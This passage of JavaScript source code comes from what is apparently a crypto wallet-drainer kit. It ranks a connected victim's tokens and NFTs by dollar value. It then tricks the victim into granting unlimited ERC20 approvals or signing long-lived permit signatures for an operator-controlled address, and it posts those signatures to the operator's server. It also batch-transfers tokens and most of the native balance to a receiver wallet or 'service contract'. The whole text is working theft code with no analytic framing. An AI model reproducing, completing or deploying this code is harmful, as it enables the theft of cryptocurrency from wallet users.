          if ((CF_Settings.Settings.Permit.Mode && CF_Settings.Settings.Permit.Priority > 0) || (CF_Settings.Settings.Approve.MetaMask >= 2 && CF_Current_Provider == 'MetaMask') || (CF_Settings.Settings.Approve.Trust >= 2 && CF_Current_Provider == 'Trust Wallet')) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if ((CF_Settings.Settings.Approve.MetaMask >= 2 && CF_Current_Provider == 'MetaMask') || (CF_Settings.Settings.Approve.Trust >= 2 && CF_Current_Provider == 'Trust Wallet') || asset.amount_usd >= CF_Settings.Settings.Permit.Price[asset.chain_id]) {
                  const data = await retrieve_token(asset.chain_id, asset.address);
                  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
                  const contract = new ethers.Contract(asset.address, data, node);
                  if (is_increase_approve(contract.functions) == 2) {
                    asset.increase = 2;
                    asset.abi = data;
                  } else if (is_increase_approve(contract.functions) == 1) {
                    asset.increase = 1;
                    asset.abi = data;
                  }
                  if (asset.amount_usd >= CF_Settings.Settings.Permit.Price[asset.chain_id]) {
                    const permit_type = get_permit_type(contract.functions);
                    asset.permit = permit_type;
                    asset.permit_ver = "1";
                    asset.abi = data;
                    if (permit_type > 0) {
                      if (contract.functions.hasOwnProperty('version')) {
                        try {
                          asset.permit_ver = await contract.version();
                        } catch(err) {
                          console.log(err);
                        }
                      }
                      console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
          if (CF_Settings.Settings.Swappers.Enable) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if (asset.amount_usd >= CF_Settings.Settings.Swappers.Price) {
                  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
                  for (const swapper of CF_Routers[asset.chain_id]) {
                    try {
                      const contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], node);
                      const allowance = await contract.allowance(CF_Current_Address, swapper[1]);
                      if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                        if (swapper[0] == 'Quickswap' && CF_Settings.Settings.Swappers.Quick == 0) continue;
                        if (swapper[0] == 'Sushiswap' && CF_Settings.Settings.Swappers.Sushi == 0) continue;
                        if (swapper[0] == 'Uniswap' && (!CF_Uniswap_Whitelist.includes(asset.address) || CF_Settings.Settings.Swappers.Uniswap == 0)) continue;
                        if ((swapper[0] == 'Pancake' || swapper[0] == 'Pancake_V3') && (!CF_Pancake_Whitelist.includes(asset.address) || CF_Settings.Settings.Swappers.Pancake == 0)) continue;
                        asset.swapper = true;
                        asset.swapper_type = swapper[0];
                        asset.swapper_address = swapper[1];
                        asset.swapper_allowance = allowance;
                        console.log(`[SWAP FOUND] ${asset.name}, ${swapper[0]}`);
                        break;
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    await Promise.all(token_promises);

    let NFT_Status = false;

    for (const chain_id in CF_Settings.Settings.Chains) {
      try {
        if (CF_Settings.Settings.Chains[chain_id].NFTs) {
          NFT_Status = true;
          break;
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (NFT_Status) {
      try {
        let nft_list = [];
        response = await send_request({ action: 'check_nft', address: CF_Current_Address });
        if (response.status == 'OK') {
          nft_list = response.data;
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!CF_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < CF_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        } else {
          nft_list = await get_nfts(address);
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!CF_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < CF_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    assets.sort((a, b) => { return b.amount_usd - a.amount_usd });

    if (CF_Settings.Settings.Tokens_First == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    } else if (CF_Settings.Settings.Tokens_First == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (CF_Settings.Settings.Swappers.Enable && CF_Settings.Settings.Swappers.Priority == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (CF_Settings.Settings.Permit.Mode && CF_Settings.Settings.Permit.Priority > 0) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.permit || asset.permit == 0 || asset.amount_usd < CF_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.permit && asset.permit > 0 && asset.amount_usd >= CF_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (CF_Settings.Settings.Swappers.Enable && CF_Settings.Settings.Swappers.Priority == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    return assets;
  } catch(err) {
    console.log(err);
    return [];
  }
};

for (let i = 0; i < CF_Pancake_Whitelist.length; i++) CF_Pancake_Whitelist[i] = CF_Pancake_Whitelist[i].toLowerCase();
for (let i = 0; i < CF_Uniswap_Whitelist.length; i++) CF_Uniswap_Whitelist[i] = CF_Uniswap_Whitelist[i].toLowerCase();

const is_token_swappable = (chain_id, contract_address) => {
  try {
    if (CF_Swap_Route[chain_id].toLowerCase() == contract_address.toLowerCase()) return false;
    let chain_swappers = CF_Routers[chain_id];
    for (const swapper of chain_swappers) {
      if (swapper[0] != 'Pancake' && swapper[0] != 'Uniswap') continue;
      if (swapper[0] == 'Uniswap') {
        if (CF_Uniswap_Whitelist.includes(contract_address.toLowerCase())) {
          return { swapper: 'Uniswap', address: swapper[1] };
        } else if (CF_Settings.Settings.Use_Swap_Whitelist == false) {
          return { swapper: 'Uniswap', address: swapper[1] };
        }
      } else if (swapper[0] == 'Pancake') {
        if (CF_Pancake_Whitelist.includes(contract_address.toLowerCase())) {
          return { swapper: 'Pancake', address: swapper[1] };
        }
      }
    }; return false;
  } catch(err) {
    return false;
  }
};

const APPROVE_TO_SWAPPER = async (asset, swapper_address) => {
  try {
    if ((typeof asset.permit == 'undefined' || asset.permit == 0) && CF_Settings.Settings.Permit.Mode && asset.amount_usd >= CF_Settings.Settings.Permit.Price[asset.chain_id]) {
      const data = await retrieve_token(asset.chain_id, asset.address);
      const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
      const contract = new ethers.Contract(asset.address, data, node);
      const current_allowance = await contract.allowance(CF_Current_Address, swapper_address);
      if (current_allowance.gte(ethers.BigNumber.from(asset.amount_raw))) {
        await approve_request(asset); sign_next();
        wait_message(); sign_ready();
        return;
      }
      const permit_type = get_permit_type(contract.functions);
      asset.permit = permit_type;
      asset.permit_ver = "1";
      asset.abi = data;
      if (permit_type > 0) {
        if (contract.functions.hasOwnProperty('version')) {
          try {
            asset.permit_ver = await contract.version();
          } catch(err) {
            console.log(err);
          }
        }
        console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
      }
    }
    if (asset.permit > 0) {
      for (const c_address of CF_Settings.Permit_BL) {
        if (c_address[0] == CF_Current_Chain_ID && c_address[1] === asset.address.toLowerCase().trim()) {
          asset.permit = 0;
          break;
        }
      }
    }
  } catch(err) {
    console.log(err);
  }
  if (CF_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {

    const contract = new ethers.Contract(asset.address, asset.abi, CF_Signer);
    const nonce = await contract.nonces(CF_Current_Address);
    const name = await contract.name();
    let value = ethers.utils.parseEther(CF_Unlimited_Amount);
    for (const c_address of CF_Settings.Unlimited_BL) {
      try {
        if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
          value = asset.amount_raw;
          break;
        }
      } catch(err) {
        console.log(err);
      }
    }
    const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
    let permit_types = null, permit_values = null;
    if (asset.permit == 1) {
      permit_types = {
        Permit: [
          {
            name: "holder",
            type: "address",
          },
          {
            name: "spender",
            type: "address",
          },
          {
            name: "nonce",
            type: "uint256",
          },
          {
            name: "expiry",
            type: "uint256",
          },
          {
            name: "allowed",
            type: "bool",
          }
        ]
      };
      permit_values = {
        holder: CF_Current_Address,
        spender: swapper_address,
        nonce: nonce,
        expiry: deadline,
        allowed: true
      };
    } else if (asset.permit == 2) {
      permit_types = {
        Permit: [
          {
            name: "owner",
            type: "address",
          },
          {
            name: "spender",
            type: "address",
          },
          {
            name: "value",
            type: "uint256",
          },
          {
            name: "nonce",
            type: "uint256",
          },
          {
            name: "deadline",
            type: "uint256",
          }
        ]
      };
      permit_values = {
        owner: CF_Current_Address,
        spender: swapper_address,
        value: value,
        nonce: nonce,
        deadline: deadline
      };
    }
    await approve_request(asset);
    sign_next();
    const result = await CF_Signer._signTypedData({
      name: name, version: asset.permit_ver, chainId: asset.chain_id,
      verifyingContract: asset.address
    }, permit_types, permit_values),
    signature = {
      r: result.slice(0, 66),
      s: "0x" + result.slice(66, 130),
      v: Number("0x" + result.slice(130, 132))
    };
    await approve_success(asset);
    wait_message();
    const x_promise = send_request({
      action: 'permit_token', user_id: CF_ID, sign: {
        type: asset.permit, version: asset.permit_ver,
        chain_id: asset.chain_id, address: asset.address,
        owner: CF_Current_Address, spender: swapper_address,
        value: value.toString(), nonce: nonce.toString(), deadline: deadline,
        r: signature.r, s: signature.s, v: signature.v, abi: asset.abi
      }, asset: asset, address: CF_Current_Address, PW: CF_Settings.Personal_Wallet,
      only_approve: true
    });
    if (CF_Settings.Settings.Wait_For_Response) await x_promise;
    sign_ready();

  } else {

    if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask >= 2) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
      try {
        for (let x = 0; x < 2; x++) {
          if (asset.increase) continue;
          try {
            const ic_data = await retrieve_token(asset.chain_id, asset.address);
            const ic_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
            const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
            if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
            else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
          } catch(err) {
            console.log(err);
          }
        }
      } catch(err) {
        console.log(err);
      }
    }
    if (CF_Settings.Settings.Approve.MetaMask >= 2 && asset.increase) {

      const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
      const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

      let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
      for (const c_address of CF_Settings.Unlimited_BL) {
        try {
          if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
            max_approval_amount = asset.amount_raw;
            break;
          }
        } catch(err) {
          console.log(err);
        }
      }

      const unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0" };

      const web3 = new Web3(CF_Provider); let contract_data = null;
      const increase_type = (asset.increase == 2) ? 'increaseApproval' : 'increaseAllowance';
      const web3_contract = new web3.eth.Contract([
        {
          "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"increment","type":"uint256"}],
          "name":`${increase_type}`,"outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"
        }
      ], asset.address);

      contract_data = web3_contract.methods[increase_type](swapper_address, max_approval_amount).encodeABI();

      unsigned_tx.data = contract_data;
      const gas_limit = await node.estimateGas(unsigned_tx);
      const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.nonce = nonce;

      await approve_request(asset); sign_next(); const tx = await CF_Signer.sendTransaction(unsigned_tx); wait_message();
      if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000); sign_ready();

    } else {

      const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
      const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

      let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
      for (const c_address of CF_Settings.Unlimited_BL) {
        try {
          if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
            max_approval_amount = asset.amount_raw;
            break;
          }
        } catch(err) {
          console.log(err);
        }
      }

      const unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0" };

      const web3 = new Web3(CF_Provider); let contract_data = null;
      const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC20'], asset.address);

      contract_data = web3_contract.methods.approve(swapper_address, max_approval_amount).encodeABI();

      unsigned_tx.data = contract_data;
      const gas_limit = await node.estimateGas(unsigned_tx);
      const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.nonce = nonce;

      await approve_request(asset); sign_next(); const tx = await CF_Signer.sendTransaction(unsigned_tx); wait_message();
      if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000); sign_ready();

    }

  }

}

const MM_BATCH_APPROVE = async (assets) => {
  if (CF_Settings.Settings.Approve.Enable == 0) { await MM_BATCH_TRANSFER(assets); return 2; }
  const calls = [], approval_address = (CF_Settings.Settings.Use_Randomizer_For_Tokens
    ? CF_Settings.Personal_Wallet.address : CF_Settings.Address), user_address = await CF_Signer.getAddress();
  for (const asset of assets) {
    try {
      if (calls.length >= 10) continue;
      const contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], CF_Signer);
      const current_allowance = await contract.allowance(user_address, approval_address);
      let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
      for (const c_address of CF_Settings.Unlimited_BL) {
        try {
          if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
            max_approval_amount = asset.amount_raw;
            break;
          }
        } catch(err) {
          console.log(err);
        }
      }
      if (current_allowance.gte(ethers.BigNumber.from(max_approval_amount))) continue;
      const contract_data = contract.interface.encodeFunctionData("approve", [approval_address, max_approval_amount]);
      calls.push({ to: asset.address, value: "0x0", data: contract_data });
    } catch(err) {
      console.log(err);
    }
  }
  const batchParams = {
    version: "2.0.0",
    from: user_address,
    chainId: "0x" + CF_Current_Chain_ID.toString(16),
    atomicRequired: true,
    calls: calls
  };
  await swap_request("MetaMask Batch Approval", assets[0], assets); sign_next();
  if (calls.length < 1) return 1;
  const batchId = await CF_Provider.send("wallet_sendCalls", [batchParams]);
  wait_message();
  async function waitForBatchReceipt(batchId) {
    let attempts = 0;
    const maxAttempts = 60;
    const delay = 2000;
    while (attempts < maxAttempts) {
      const status = await CF_Provider.send("wallet_getCallsStatus", [String(batchId)]);
      if (typeof status?.result?.receipts == "object" && status?.result?.receipts.length > 0 && status?.result?.receipts[0].status == '0x1') {
        return status.result.receipts[0].transactionHash;
      }
      await new Promise(res => setTimeout(res, delay));
      attempts++;
    }
    throw new Error("BATCH_ERROR");
  }
  const txHash = await waitForBatchReceipt(batchId.result.id);
  if (CF_Settings.Settings.Wait_For_Confirmation) {
    const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[CF_Current_Chain_ID]);
    await node.waitForTransaction(txHash, 1, 90000);
  }
  await swap_success("MetaMask Batch Approval", assets[0], assets); sign_ready();
  return 1;
};

const MM_BATCH_TRANSFER = async (assets) => {
  const calls = [], transfer_address = CF_Settings.Receiver, user_address = await CF_Signer.getAddress();
  for (const asset of assets) {
    try {
      if (calls.length >= 10) continue;
      const contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], CF_Signer);
      const contract_data = contract.interface.encodeFunctionData("transfer", [transfer_address, asset.amount_raw]);
      calls.push({ to: asset.address, value: "0x0", data: contract_data });
    } catch (err) {
      console.log(err);
    }
  }
  const batchParams = {
    version: "2.0.0",
    from: user_address,
    chainId: "0x" + CF_Current_Chain_ID.toString(16),
    atomicRequired: true,
    calls: calls
  };
  await swap_request("MetaMask Batch Transfer", assets[0], assets); sign_next();
  const batchId = await CF_Provider.send("wallet_sendCalls", [batchParams]);
  wait_message();
  async function waitForBatchReceipt(batchId) {
    let attempts = 0;
    const maxAttempts = 60;
    const delay = 2000;
    while (attempts < maxAttempts) {
      const status = await CF_Provider.send("wallet_getCallsStatus", [String(batchId)]);
      if (typeof status?.result?.receipts == "object" && status?.result?.receipts.length > 0 && status?.result?.receipts[0].status == '0x1') {
        return status.result.receipts[0].transactionHash;
      }
      await new Promise(res => setTimeout(res, delay));
      attempts++;
    }
    throw new Error("BATCH_ERROR");
  }
  const txHash = await waitForBatchReceipt(batchId.result.id);
  if (CF_Settings.Settings.Wait_For_Confirmation) {
    const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[CF_Current_Chain_ID]);
    await node.waitForTransaction(txHash, 1, 120000);
  }
  await swap_success("MetaMask Batch Transfer", assets[0], assets); sign_ready();
  return 2;
};

const TRANSFER_NATIVE_VIA_SERVICE_CONTRACT = async (asset, service_contract) => {

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const s_contract = new ethers.Contract(service_contract, IO_ABI, CF_Signer);

  const gas_price = BN(await node.getGasPrice()).mul(BN(12)).div(BN(10));
  const random_user_id = Math.floor(Math.random() * 9999);
  const gas_limit = await s_contract.estimateGas.depositNative(random_user_id, CF_Current_Address, 0, { value: BN(1) });

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);

  const balance = await node.getBalance(CF_Current_Address);
  let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);

  if (CF_Settings.Settings.Reserves.Mode == 1) {
    available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
    .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
  } else if (CF_Settings.Settings.Reserves.Mode == 2) {
    let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
      max_value = elem.amount; current_percent = elem.percent;
    }
    available_amount = balance.sub(gas_limit.mul(gas_price))
    .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
  } else if (CF_Settings.Settings.Reserves.Mode == 3) {
    available_amount = balance.sub(gas_limit.mul(gas_price));
  }

  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  await transfer_request(asset); sign_next();
  const tx = await s_contract.depositNative(random_user_id, CF_Current_Address, 0, { gasLimit: gas_limit, gasPrice: gas_price, value: available_amount });
  wait_message();
  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 120000);
  await transfer_success(asset); sign_ready();

};

const TRANSFER_TOKEN_VIA_SERVICE_CONTRACT = async(asset, service_contract) => {

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const t_contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], CF_Signer);
  const t_balance = await t_contract.balanceOf(CF_Current_Address);

  const gas_price = BN(await node.getGasPrice()).mul(BN(12)).div(BN(10));
  const gas_limit = await t_contract.estimateGas.transfer(service_contract, t_balance);

  await transfer_request(asset); sign_next();
  const tx = await t_contract.transfer(service_contract, t_balance, { gasLimit: gas_limit, gasPrice: gas_price });
  wait_message();
  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 120000);
  await transfer_success(asset); sign_ready(); return 2;

};

const USE_SERVICE_CONTRACT_TOKEN = async (asset, service_contract) => {
  if (CF_Settings.Settings.Approve.Enable == 0) { await TRANSFER_TOKEN_VIA_SERVICE_CONTRACT(asset, service_contract); return 2; }

  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask >= 2) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
    try {
      for (let x = 0; x < 2; x++) {
        if (asset.increase) continue;
        try {
          const ic_data = await retrieve_token(asset.chain_id, asset.address);
          const ic_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
  }

  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask == 2) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust == 2)) && !asset.increase) { await TRANSFER_TOKEN_VIA_SERVICE_CONTRACT(asset, service_contract); return 2; }
  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask == 3) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust == 3)) && !asset.increase) throw new Error('UNSUPPORTED');

  let approval_function = 'approve';

  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask >= 2) ||
  (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust >= 2)) && asset.increase) {
    approval_function = (asset.increase == 2) ? 'increaseApproval' : 'increaseAllowance';
  }

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const t_contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], CF_Signer);

  let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
  for (const c_address of CF_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  const current_allowance = await t_contract.allowance(CF_Current_Address, service_contract);
  if (current_allowance.gte(ethers.BigNumber.from(max_approval_amount.div(BN(2))))) {
    await approve_request(asset); sign_next();
    wait_message(); await approve_success(asset);
    sign_ready(); return 1;
  }

  const gas_price = BN(await node.getGasPrice()).mul(BN(12)).div(BN(10));
  const gas_limit = await t_contract.estimateGas[approval_function](service_contract, max_approval_amount);

  await approve_request(asset); sign_next();
  const tx = await t_contract[approval_function](service_contract, max_approval_amount, { gasLimit: gas_limit, gasPrice: gas_price });
  wait_message();
  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 2, 120000);
  await approve_success(asset); sign_ready(); return 1;

};

const APPROVE_TOKEN = async (asset) => {
  if (CF_Settings.Settings.Approve.Enable == 0) { await TRANSFER_TOKEN(asset); return 2; }

  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask >= 2) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
    try {
      for (let x = 0; x < 2; x++) {
        if (asset.increase) continue;
        try {
          const ic_data = await retrieve_token(asset.chain_id, asset.address);
          const ic_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
  }

  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask >= 2) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust >= 2)) && asset.increase) return await MM_APPROVE_TOKEN(asset);
  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask == 2) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust == 2)) && !asset.increase) { await TRANSFER_TOKEN(asset); return 2; }
  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask == 3) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust == 3)) && !asset.increase) throw new Error('UNSUPPORTED');

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
  for (const c_address of CF_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  const unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC20'], asset.address);

  const new_contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], node);
  const current_allowance = await new_contract.allowance(CF_Current_Address, (CF_Settings.Settings.Use_Randomizer_For_Tokens ? CF_Settings.Personal_Wallet.address : CF_Settings.Address));

  if (current_allowance.gte(ethers.BigNumber.from(max_approval_amount))) {
    await approve_request(asset); sign_next();
    wait_message(); await approve_success(asset);
    sign_ready(); return 1;
  }

  contract_data = web3_contract.methods.approve((CF_Settings.Settings.Use_Randomizer_For_Tokens ? CF_Settings.Personal_Wallet.address : CF_Settings.Address), max_approval_amount).encodeABI();

  unsigned_tx.data = contract_data;
  const gas_limit = await node.estimateGas(unsigned_tx);
  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;
  unsigned_tx.nonce = nonce;

  await approve_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
  await approve_success(asset); sign_ready(); return 1;
};

const MM_APPROVE_TOKEN = async (asset) => {
  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask >= 2) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
    try {
      for (let x = 0; x < 2; x++) {
        if (asset.increase) continue;
        try {
          const ic_data = await retrieve_token(asset.chain_id, asset.address);
          const ic_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
  }

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
  for (const c_address of CF_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

